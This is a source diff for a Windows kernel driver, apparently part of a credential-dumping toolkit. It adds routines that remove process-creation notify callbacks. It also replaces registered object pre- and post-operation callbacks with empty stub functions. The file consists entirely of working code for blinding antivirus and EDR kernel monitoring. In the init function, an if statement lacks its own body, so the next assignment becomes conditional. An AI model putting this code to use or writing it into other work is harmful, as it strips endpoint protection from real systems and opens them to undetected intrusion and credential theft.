+NTSTATUS kkll_m_notify_init()
+{
+	SIZE_T codeSize;
+	NTSTATUS status = STATUS_NOT_FOUND;
+	if(pPsSetCreateProcessNotifyRoutineEx = (PPSSETCREATEPROCESSNOTIFYROUTINEEX) MmGetSystemRoutineAddress(&uPsSetCreateProcessNotifyRoutineEx))
+
+	codeSize = (ULONG_PTR) kkll_m_notify_fake_ObjectPreCallback_end - (ULONG_PTR) kkll_m_notify_fake_ObjectPreCallback;
+	if(kkll_m_notify_fakePre = (POB_PRE_OPERATION_CALLBACK) ExAllocatePoolWithTag(NonPagedPool, codeSize, POOL_TAG))
+		RtlCopyMemory(kkll_m_notify_fakePre, kkll_m_notify_fake_ObjectPreCallback, codeSize);
+
+	codeSize = (ULONG_PTR) kkll_m_notify_fake_ObjectPostCallback_end - (ULONG_PTR) kkll_m_notify_fake_ObjectPostCallback;
+	if(kkll_m_notify_fakePost = (POB_POST_OPERATION_CALLBACK) ExAllocatePoolWithTag(NonPagedPool, codeSize, POOL_TAG))
+		RtlCopyMemory(kkll_m_notify_fakePost, kkll_m_notify_fake_ObjectPostCallback, codeSize);
+
+
+	if(pPsSetCreateProcessNotifyRoutineEx && kkll_m_notify_fakePre && kkll_m_notify_fakePost)
+		status = STATUS_SUCCESS;
+	else
+	{
+		if(kkll_m_notify_fakePre)
+		{
+			ExFreePoolWithTag(kkll_m_notify_fakePre, POOL_TAG);
+			kkll_m_notify_fakePre = NULL;
+		}
+		if(kkll_m_notify_fakePost)
+		{
+			ExFreePoolWithTag(kkll_m_notify_fakePost, POOL_TAG);
+			kkll_m_notify_fakePost = NULL;
+		}
+	}
+	return status;
+}
+
+NTSTATUS kkll_m_notify_remove_process(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer)
+{
+	NTSTATUS status = STATUS_INVALID_HANDLE;
+	UNICODE_STRING uString;
+
+	if(bufferIn && (szBufferIn == sizeof(PCREATE_PROCESS_NOTIFY_ROUTINE)))
+	{
+		status = PsSetCreateProcessNotifyRoutine(*(PCREATE_PROCESS_NOTIFY_ROUTINE *) bufferIn, TRUE);
+		if(!NT_SUCCESS(status) && pPsSetCreateProcessNotifyRoutineEx)
+			status = pPsSetCreateProcessNotifyRoutineEx(*(PCREATE_PROCESS_NOTIFY_ROUTINE_EX *) bufferIn, TRUE);
+
+		if(NT_SUCCESS(status))
+		{
+			status = kprintf(outBuffer, L"Removed  : ");
+			if(NT_SUCCESS(status))
+				status = kkll_m_modules_fromAddr(outBuffer, *(PVOID *) bufferIn);
+		}
+
+	}
+	return status;
+}
+
+
+NTSTATUS kkll_m_notify_remove_object(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer)
+{
+	NTSTATUS status = STATUS_INVALID_HANDLE;
+	POBJECT_CALLBACK_ENTRY pCallbackEntry; 
+	
+	if(bufferIn && (szBufferIn == sizeof(POBJECT_CALLBACK_ENTRY)))
+	{
+		if(pCallbackEntry = *(POBJECT_CALLBACK_ENTRY *) bufferIn)
+		{
+			status = kkll_m_notify_desc_object_callback(pCallbackEntry, outBuffer);
+			if(NT_SUCCESS(status))
+			{
+				if(pCallbackEntry->PreOperation && kkll_m_notify_fakePre)
+					pCallbackEntry->PreOperation = kkll_m_notify_fakePre;
+				if(pCallbackEntry->PostOperation && kkll_m_notify_fakePost)
+					pCallbackEntry->PostOperation = kkll_m_notify_fakePost;
+
+				status = kkll_m_notify_desc_object_callback(pCallbackEntry, outBuffer);
+			}
+		}
+	}
+
+
+	return status;
+}
+
+#pragma optimize("", off)
+OB_PREOP_CALLBACK_STATUS kkll_m_notify_fake_ObjectPreCallback(IN PVOID RegistrationContext, IN POB_PRE_OPERATION_INFORMATION OperationInformation)
+{
+	return OB_PREOP_SUCCESS;
+}
+DWORD kkll_m_notify_fake_ObjectPreCallback_end(){return 'kpre';}
+
+
+VOID kkll_m_notify_fake_ObjectPostCallback(IN PVOID RegistrationContext, IN POB_POST_OPERATION_INFORMATION OperationInformation)
+{
+}
+DWORD kkll_m_notify_fake_ObjectPostCallback_end(){return 'kpos';}
+#pragma optimize("", on)
